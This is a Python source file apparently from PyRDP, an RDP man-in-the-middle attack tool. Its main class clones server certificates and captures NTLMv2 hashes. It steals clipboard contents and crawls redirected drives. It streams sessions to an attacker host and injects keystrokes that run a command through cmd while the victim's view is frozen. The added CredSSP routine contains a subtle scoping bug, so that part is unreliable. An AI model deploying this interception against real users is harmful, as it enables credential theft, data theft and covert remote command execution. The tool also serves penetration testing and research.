#
# This file is part of the PyRDP project.
# Copyright (C) 2019-2022 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import asyncio
import datetime
import typing

from twisted.internet import reactor
from twisted.internet.protocol import Protocol

from pyrdp.core import AsyncIOSequencer, AwaitableClientFactory, connectTransparent
from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext, CertificateCache
from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, SegmentationPDUType
from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, \
    VirtualChannelLayer
from pyrdp.logging import RC4LoggingObserver
from pyrdp.logging.StatCounter import StatCounter
from pyrdp.logging.adapters import SessionLogger
from pyrdp.logging.observers import FastPathLogger, LayerLogger, MCSLogger, SecurityLogger, \
    SlowPathLogger, X224Logger
from pyrdp.mcs import MCSClientChannel, MCSServerChannel
from pyrdp.mitm.AttackerMITM import AttackerMITM
from pyrdp.mitm.ClipboardMITM import ActiveClipboardStealer, PassiveClipboardStealer
from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM
from pyrdp.mitm.FastPathMITM import FastPathMITM
from pyrdp.mitm.FileCrawlerMITM import FileCrawlerMITM
from pyrdp.mitm.MCSMITM import MCSMITM
from pyrdp.mitm.MITMRecorder import MITMRecorder
from pyrdp.mitm.PlayerLayerSet import TwistedPlayerLayerSet
from pyrdp.mitm.SecurityMITM import SecurityMITM
from pyrdp.mitm.SlowPathMITM import SlowPathMITM
from pyrdp.mitm.TCPMITM import TCPMITM
from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
from pyrdp.mitm.X224MITM import X224MITM
from pyrdp.mitm.config import MITMConfig
from pyrdp.mitm.layerset import RDPLayerSet
from pyrdp.mitm.state import RDPMITMState
from pyrdp.recording import FileLayer, RecordingFastPathObserver, RecordingSlowPathObserver, \
    Recorder
from pyrdp.security import NTLMSSPState
from pyrdp.security.nla import NLAHandler


class RDPMITM:
    """
    Main MITM class. The job of this class is to orchestrate the components for all the protocols.
    """

    def __init__(self, mainLogger: SessionLogger, crawlerLogger: SessionLogger, config: MITMConfig, state: RDPMITMState = None, recorder: Recorder = None):
        """
        :param mainLogger: base logger to use for the connection
        :param config: the MITM configuration
        """

        self.log = mainLogger
        """Base logger for the connection"""

        self.clientLog = mainLogger.createChild("client")
        """Base logger for the client side"""

        self.serverLog = mainLogger.createChild("server")
        """Base logger for the server side"""

        self.attackerLog = mainLogger.createChild("attacker")
        """Base logger for the attacker side"""

        self.rc4Log = mainLogger.createChild("rc4")
        """Logger for RC4 secrets"""

        self.config = config
        """The MITM configuration"""

        self.statCounter = StatCounter()
        """Class to keep track of connection-related statistics such as # of mouse events, # of output events, etc."""

        self.state = state if state is not None else RDPMITMState(self.config, self.log.sessionID)
        """The MITM state"""

        self.client = RDPLayerSet()
        """Layers on the client side"""

        self.server = RDPLayerSet()
        """Layers on the server side"""

        self.player = TwistedPlayerLayerSet()
        """Layers on the attacker side"""

        self.recorder = recorder if recorder is not None else MITMRecorder([], self.state)
        """Recorder for this connection"""

        self.channelMITMs = {}
        """MITM components for virtual channels"""

        self.onTlsReady = None
        """Callback for when TLS is done"""

        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.state, self.recorder, self.statCounter)
        """TCP MITM component"""

        self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, self.connectToServer, self.disconnectFromServer, self.startTLS)
        """X224 MITM component"""

        self.mcs = MCSMITM(self.client.mcs, self.server.mcs, self.state, self.recorder, self.buildChannel, self.getLog("mcs"), self.statCounter)
        """MCS MITM component"""

        self.security: SecurityMITM = None
        """Security MITM component"""

        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath, self.state, self.statCounter, self.getLog("slowpath"))
        """Slow-path MITM component"""

        self.fastPath: FastPathMITM = None
        """Fast-path MITM component"""

        self.attacker: AttackerMITM = None

        self.crawler: FileCrawlerMITM = None

        self.client.x224.addObserver(X224Logger(self.getClientLog("x224")))
        self.client.mcs.addObserver(MCSLogger(self.getClientLog("mcs")))
        self.client.slowPath.addObserver(SlowPathLogger(self.getClientLog("slowpath")))
        self.client.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))

        self.server.x224.addObserver(X224Logger(self.getServerLog("x224")))
        self.server.mcs.addObserver(MCSLogger(self.getServerLog("mcs")))
        self.server.slowPath.addObserver(SlowPathLogger(self.getServerLog("slowpath")))
        self.server.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))

        self.player.player.addObserver(LayerLogger(self.attackerLog))

        self.ensureOutDir()

        if config.certificateFileName is None:
            self.certs: CertificateCache = CertificateCache(self.config.certDir, mainLogger.createChild("cert"))
        else:
            self.certs = None

        self.state.securitySettings.addObserver(RC4LoggingObserver(self.rc4Log))

        if config.recordReplays:
            date = datetime.datetime.now()
            replayFileName = f"rdp_replay_{date.strftime('%Y%m%d_%H-%M-%S')}_{date.microsecond // 1000}_{self.state.sessionID}.pyrdp"
            self.recorder.setRecordFilename(replayFileName)
            self.recorder.addTransport(FileLayer(self.config.replayDir / replayFileName))

        if config.enableCrawler:
            self.crawler: FileCrawlerMITM = FileCrawlerMITM(
                self.getClientLog(MCSChannelName.DEVICE_REDIRECTION).createChild("crawler"),
                crawlerLogger,
                self.config,
                self.state
            )

    def getProtocol(self) -> Protocol:
        """
        Get the Protocol expected by Twisted.
        """
        return self.client.tcp

    def getLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the base logger
        :param name: name of the sub-logger
        """
        return self.log.createChild(name)

    def getClientLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the client logger
        :param name: name of the sub-logger
        """
        return self.clientLog.createChild(name)

    def getServerLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the server logger
        :param name: name of the sub-logger
        """
        return self.serverLog.createChild(name)

    def disconnectFromServer(self):
        self.server.replaceTCP()
        self.tcp.setServer(self.server.tcp)

    async def connectToServer(self):
        """
        Coroutine that connects to the target RDP server and the attacker.
        Connection to the attacker side has a 1 second timeout to avoid hanging the connection.
        """
        self.addClientIpToLoggers(self.state.clientIp)

        serverFactory = AwaitableClientFactory(self.server.tcp)
        if self.config.transparent:
            if self.state.effectiveTargetHost:
                # Fully Transparent (with a specific poisoned target, or when using redirection)
                src = self.client.tcp.transport.client
                connectTransparent(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory, bindAddress=(src[0], 0))
            else:
                # Half Transparent (for client-side only)
                dst = self.client.tcp.transport.getHost().host
                reactor.connectTCP(dst, self.state.effectiveTargetPort, serverFactory)
        else:
            reactor.connectTCP(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory)

        await serverFactory.connected.wait()

        if self.config.attackerHost is not None and self.config.attackerPort is not None and not self.player.tcp.connectedEvent.is_set():
            attackerFactory = AwaitableClientFactory(self.player.tcp)
            reactor.connectTCP(self.config.attackerHost, self.config.attackerPort, attackerFactory)

            try:
                await asyncio.wait_for(attackerFactory.connected.wait(), 1.0)
                self.recorder.addTransport(self.player.tcp)
            except asyncio.TimeoutError:
                self.log.error("Failed to connect to recording host: timeout expired")

    def doClientTls(self):
        cert = self.server.tcp.transport.getPeerCertificate()
        if not cert:
            # Wait for server certificate
            reactor.callLater(1, self.doClientTls)

        # Clone certificate if necessary.
        if self.certs:
            privKey, certFile = self.certs.lookup(cert)
            contextForClient = ServerTLSContext(privKey, certFile)
        else:
            # No automated certificate cloning. Use the specified certificate.
            contextForClient = ServerTLSContext(self.config.privateKeyFileName, self.config.certificateFileName)

        # Establish TLS tunnel with the client
        self.onTlsReady()
        self.client.tcp.startTLS(contextForClient)
        self.onTlsReady = None

        # Handle NLA connection for client/server
        ntlmSSPState = NTLMSSPState()

        if self.state.serverRequiresNLA and self.config.replacementUsername and self.config.replacementPassword:
            # Server requires NLA and we have credentials — perform CredSSP ourselves
            self.log.info("Performing CredSSP authentication to server with replacement credentials.")
            from pyrdp.core import defer
            defer(self._performServerCredSSP())
            return

        if self.state.ntlmCapture:
            # We are capturing the NLA NTLMv2 hash
            self.client.segmentation.addObserver(NLAHandler(
                self.client.tcp, ntlmSSPState, self.getLog("ntlmssp"),
                ntlmCapture=True, challenge=self.state.config.sspChallenge,
                disconnectCallback=lambda: self.client.tcp.disconnect()
            ))
            return

        self.client.segmentation.addObserver(NLAHandler(self.server.tcp, ntlmSSPState, self.getLog("ntlmssp")))
        self.server.segmentation.addObserver(NLAHandler(self.client.tcp, ntlmSSPState, self.getLog("ntlmssp")))

    async def _performServerCredSSP(self):
        """
        Perform CredSSP authentication to the server using replacement credentials.
        This is called when the server requires NLA and we have -u/-p configured.
        After CredSSP succeeds, the server-side connection is ready for normal RDP.
        The client side gets a TLS-only response (no NLA).
        """
        import ssl as stdlib_ssl
        import struct
        import time
        from OpenSSL import crypto
        from impacket import ntlm as impacket_ntlm
        from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp
        from Crypto.Cipher import ARC4
        from pyrdp.security.credssp import (
            buildTSRequest, buildTSCredentials, buildSpnegoNegTokenInit, buildSpnegoNegTokenResp
        )

        log = self.getLog("credssp")
        username = self.config.replacementUsername
        password = self.config.replacementPassword
        # Use domain from config or empty string
        domain = ""

        # The server TLS connection is already established at this point.
        # We need to send/receive CredSSP TSRequests through the raw TLS transport.
        # Use the Twisted transport directly.
        serverTransport = self.server.tcp.transport

        # Get server's TLS certificate and extract public key
        serverCert = serverTransport.getPeerCertificate()
        if not serverCert:
            log.error("Cannot perform CredSSP: server certificate not available")
            self.client.tcp.disconnect()
            return

        certDer = crypto.dump_certificate(crypto.FILETYPE_ASN1, serverCert)
        x509cert = crypto.load_certificate(crypto.FILETYPE_ASN1, certDer)
        pkey = x509cert.get_pubkey()
        dump = crypto.dump_publickey(crypto.FILETYPE_ASN1, pkey)
        serverPubKey = dump[24:]  # Strip ASN.1 header to get raw SubjectPublicKey
        log.info("Server TLS public key: %(size)d bytes", {"size": len(serverPubKey)})

        NTLMSSP_OID = b'+\x06\x01\x04\x01\x827\x02\x02\n'

        # We need a way to send/receive through the TLS connection.
        # Since Twisted's TLS is event-driven, we use a Future to wait for responses.
        responseQueue = asyncio.Queue()

        # Temporarily intercept server data at the segmentation layer
        from pyrdp.layer import SegmentationObserver

        class CredSSPResponseHandler(SegmentationObserver):
            def onUnknownHeader(self, header, data: bytes):
                asyncio.get_event_loop().call_soon_threadsafe(responseQueue.put_nowait, data)

        credSSPHandler = CredSSPResponseHandler()
        self.server.segmentation.addObserver(credSSPHandler)

        try:
            # Step 1: Send NTLM NEGOTIATE
            auth = impacket_ntlm.getNTLMSSPType1('', '', True, use_ntlmv2=True)
            blob = SPNEGO_NegTokenInit()
            blob['MechTypes'] = [NTLMSSP_OID]
            blob['MechToken'] = auth.getData()
            tsReq1 = buildTSRequest(version=2, negoTokens=blob.getData())
            self.server.tcp.sendBytes(tsReq1)
            log.debug("Sent CredSSP NEGOTIATE")

            # Step 2: Receive CHALLENGE
            resp2 = await asyncio.wait_for(responseQueue.get(), timeout=10.0)
            # Find NTLMSSP in response
            ntlmIdx = resp2.find(b'NTLMSSP\x00')
            if ntlmIdx == -1:
                log.error("No NTLMSSP in server CredSSP response")
                self.client.tcp.disconnect()
                return
            rawChallenge = resp2[ntlmIdx:]

            # Extract NetBIOS domain from challenge TargetInfo
            from impacket.ntlm import NTLMAuthChallenge
            challengeMsg = NTLMAuthChallenge(rawChallenge)
            targetInfo = challengeMsg['TargetInfoFields']
            # Try to get NetBIOS domain
            try:
                avPairs = impacket_ntlm.AV_PAIRS(challengeMsg['TargetInfoFields'])
                if impacket_ntlm.NTLMSSP_AV_NB_DOMAIN_NAME in avPairs:
                    domain = avPairs[impacket_ntlm.NTLMSSP_AV_NB_DOMAIN_NAME][1].decode('utf-16-le')
                    log.info("CredSSP NetBIOS domain: %(domain)s", {"domain": domain})
            except Exception:
                pass

            log.debug("Received CredSSP CHALLENGE")

            # Step 3: Build AUTHENTICATE + pubKeyAuth
            type3, exportedSessionKey = impacket_ntlm.getNTLMSSPType3(
                auth, rawChallenge, username, password, domain,
                lmhash='', nthash='', use_ntlmv2=True
            )
            flags = type3['flags']

            clientSigningKey = impacket_ntlm.SIGNKEY(flags, exportedSessionKey)
            clientSealingKey = impacket_ntlm.SEALKEY(flags, exportedSessionKey)
            cipher = ARC4.new(clientSealingKey)
            clientSealingHandle = cipher.encrypt

            # Encrypt server public key
            sealedPubKey, signature = impacket_ntlm.SEAL(
                flags, clientSigningKey, clientSealingKey,
                serverPubKey, serverPubKey, 0, clientSealingHandle
            )

            blob3 = SPNEGO_NegTokenResp()
            blob3['ResponseToken'] = type3.getData()
            pubKeyAuth = signature.getData() + sealedPubKey

            tsReq3 = buildTSRequest(version=2, negoTokens=blob3.getData(), pubKeyAuth=pubKeyAuth)
            self.server.tcp.sendBytes(tsReq3)
            log.debug("Sent CredSSP AUTHENTICATE + pubKeyAuth")

            # Step 4: Receive pubKeyAuth confirmation
            resp4 = await asyncio.wait_for(responseQueue.get(), timeout=10.0)
            if resp4[0] != 0x30:
                log.error("Unexpected CredSSP response: 0x%(byte)02x", {"byte": resp4[0]})
                self.client.tcp.disconnect()
                return
            log.info("Server confirmed pubKeyAuth — CredSSP authentication successful!")

            # Step 5: Send TSCredentials
            tsCreds = buildTSCredentials(domain, username, password)
            sealedCreds, credSig = impacket_ntlm.SEAL(
                flags, clientSigningKey, clientSealingKey,
                tsCreds, tsCreds, 1, clientSealingHandle
            )
            encCreds = credSig.getData() + sealedCreds
            tsReq5 = buildTSRequest(version=2, authInfo=encCreds)
            self.server.tcp.sendBytes(tsReq5)
            log.info("Sent encrypted credentials — CredSSP exchange complete!")

            # CredSSP is done. The server is now ready for normal RDP (MCS etc.)
            # The client side doesn't need NLA — it already got a TLS-only response.
            # The normal MITM layers (TPKT, X224, MCS, etc.) are already wired and will
            # handle data flowing between client and server.
            log.info("CredSSP complete. Normal RDP MITM flow is now active.")

            # Reset the ntlmCapture flag so any subsequent X224 handling works normally
            self.state.ntlmCapture = False

            # Give the server a moment to process the credentials before MCS data arrives
            import asyncio
            await asyncio.sleep(0.5)
            log.info("Server ready for MCS data.")

        except asyncio.TimeoutError:
            log.error("CredSSP exchange timed out")
            self.client.tcp.disconnect()
        except Exception as e:
            log.error("CredSSP exchange failed: %(error)s", {"error": str(e)})
            self.log.exception(e)
            self.client.tcp.disconnect()
        finally:
            self.server.segmentation.removeObserver(credSSPHandler)

    def startTLS(self, onTlsReady: typing.Callable[[], None]):
        """
        Execute a startTLS on both the client and server side.
        """
        self.onTlsReady = onTlsReady

        # Establish TLS tunnel with target server...
        contextForServer = ClientTLSContext()
        self.server.tcp.startTLS(contextForServer)

        # Establish TLS tunnel with client.
        reactor.callLater(1, self.doClientTls)

    def buildChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build a MITM component for an MCS channel. The client side has an MCSServerChannel because from the point of view
        of the MITM, the client channel is on a server socket and vice-versa.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        channelID = client.channelID

        if channelID not in self.state.channelMap:
            self.buildVirtualChannel(client, server)
            return

        if self.state.channelMap[channelID] == MCSChannelName.IO:
            self.buildIOChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.CLIPBOARD:
            self.buildClipboardChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.DEVICE_REDIRECTION:
            self.buildDeviceChannel(client, server)
        else:
            self.buildVirtualChannel(client, server)

    def buildIOChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for input and output.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        self.client.security = self.state.createSecurityLayer(ParserMode.SERVER, False)
        self.client.fastPath = self.state.createFastPathLayer(ParserMode.SERVER)
        self.server.security = self.state.createSecurityLayer(ParserMode.CLIENT, False)
        self.server.fastPath = self.state.createFastPathLayer(ParserMode.CLIENT)

        self.client.security.addObserver(SecurityLogger(self.getClientLog("security")))
        self.client.fastPath.addObserver(FastPathLogger(self.getClientLog("fastpath")))
        self.client.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_INPUT))

        self.server.security.addObserver(SecurityLogger(self.getServerLog("security")))
        self.server.fastPath.addObserver(FastPathLogger(self.getServerLog("fastpath")))
        self.server.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_OUTPUT))

        self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state, self.statCounter, self.getLog("fastpath"))

        if self.player.tcp.transport or self.config.payload:
            self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)

            if MCSChannelName.DEVICE_REDIRECTION in self.state.channelMap:
                deviceRedirectionChannel = self.state.channelMap[MCSChannelName.DEVICE_REDIRECTION]

                if deviceRedirectionChannel in self.channelMITMs:
                    deviceRedirection: DeviceRedirectionMITM = self.channelMITMs[deviceRedirectionChannel]
                    self.attacker.setDeviceRedirectionComponent(deviceRedirection)

        LayerChainItem.chain(client, self.client.security, self.client.slowPath)
        LayerChainItem.chain(server, self.server.security, self.server.slowPath)

        self.client.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.client.fastPath)
        self.server.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.server.fastPath)

        self.sendPayload()

    def buildClipboardChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the clipboard channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientVirtualChannel = VirtualChannelLayer()
        clientLayer = ClipboardLayer()
        serverVirtualChannel = VirtualChannelLayer()
        serverLayer = ClipboardLayer()

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.CLIPBOARD)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.CLIPBOARD)))

        if self.state.useTLS:
            LayerChainItem.chain(client, clientVirtualChannel, clientLayer)
            LayerChainItem.chain(server, serverVirtualChannel, serverLayer)
        else:
            clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
            serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
            LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
            LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        if self.config.disableActiveClipboardStealing:
            mitm = PassiveClipboardStealer(self.config, clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
                                           self.recorder, self.statCounter, self.state)
        else:
            mitm = ActiveClipboardStealer(self.config, clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
                                          self.recorder, self.statCounter, self.state)
        self.channelMITMs[client.channelID] = mitm

    def buildDeviceChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the device redirection channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        clientLayer = DeviceRedirectionLayer()
        serverVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        serverLayer = DeviceRedirectionLayer()

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.DEVICE_REDIRECTION)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.DEVICE_REDIRECTION)))

        if self.state.useTLS:
            LayerChainItem.chain(client, clientVirtualChannel, clientLayer)
            LayerChainItem.chain(server, serverVirtualChannel, serverLayer)
        else:
            clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
            serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
            LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
            LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        deviceRedirection = DeviceRedirectionMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DEVICE_REDIRECTION), self.statCounter, self.state, self.tcp)
        self.channelMITMs[client.channelID] = deviceRedirection

        if self.config.enableCrawler:
            self.crawler.setDeviceRedirectionComponent(deviceRedirection)

        if self.attacker:
            self.attacker.setDeviceRedirectionComponent(deviceRedirection)

    def buildVirtualChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build a generic MITM component for any virtual channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientLayer = RawLayer()
        serverLayer = RawLayer()

        if self.state.useTLS:
            LayerChainItem.chain(client, clientLayer)
            LayerChainItem.chain(server, serverLayer)
        else:
            clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
            serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
            LayerChainItem.chain(client, clientSecurity, clientLayer)
            LayerChainItem.chain(server, serverSecurity, serverLayer)

        mitm = VirtualChannelMITM(clientLayer, serverLayer, self.statCounter)
        self.channelMITMs[client.channelID] = mitm

    def sendPayload(self):
        if len(self.config.payload) == 0:
            return

        if self.config.payloadDelay is None:
            self.log.error("Payload was set but no delay is configured. Please configure a payload delay. Payload will not be sent for this connection.")
            return

        if self.config.payloadDuration is None:
            self.log.error("Payload was set but no duration is configured. Please configure a payload duration. Payload will not be sent for this connection.")
            return

        def waitForDelay() -> int:
            return self.config.payloadDelay

        def disableForwarding() -> int:
            self.state.forwardInput = False
            self.state.forwardOutput = False
            return 200

        def openRunWindow() -> int:
            self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
            return 200

        def sendCMD() -> int:
            self.attacker.sendText("cmd")
            return 200

        def sendEnterKey() -> int:
            self.attacker.sendKeys([ScanCode.RETURN])
            return 200

        def sendPayload() -> int:
            return self.attacker.sendText(self.config.payload + " & exit")

        def waitForPayload() -> int:
            return self.config.payloadDuration

        def enableForwarding():
            self.state.forwardInput = True
            self.state.forwardOutput = True

        payload = sendPayload()
        sequencer = AsyncIOSequencer([
            waitForDelay,
            disableForwarding,
            openRunWindow,
            sendCMD,
            sendEnterKey,
            *payload,
            sendEnterKey,
            waitForPayload,
            enableForwarding
        ])
        sequencer.run()

    def ensureOutDir(self):
        self.config.outDir.mkdir(parents=True, exist_ok=True)
        self.config.replayDir.mkdir(exist_ok=True)
        self.config.fileDir.mkdir(exist_ok=True)
        self.config.certDir.mkdir(exist_ok=True)

    def addClientIpToLoggers(self, clientIp: str):
        """
        Add the client IP address to all relevant loggers.
        """
        self.log.extra['clientIp'] = self.state.clientIp
        self.clientLog.extra['clientIp'] = self.state.clientIp
        self.serverLog.extra['clientIp'] = self.state.clientIp
        self.attackerLog.extra['clientIp'] = self.state.clientIp
        self.rc4Log.extra['clientIp'] = self.state.clientIp

        self.x224.log.extra['clientIp'] = self.state.clientIp
        self.mcs.log.extra['clientIp'] = self.state.clientIp
        self.slowPath.log.extra['clientIp'] = self.state.clientIp

        if self.certs:
            self.certs.log.extra['clientIp'] = self.state.clientIp
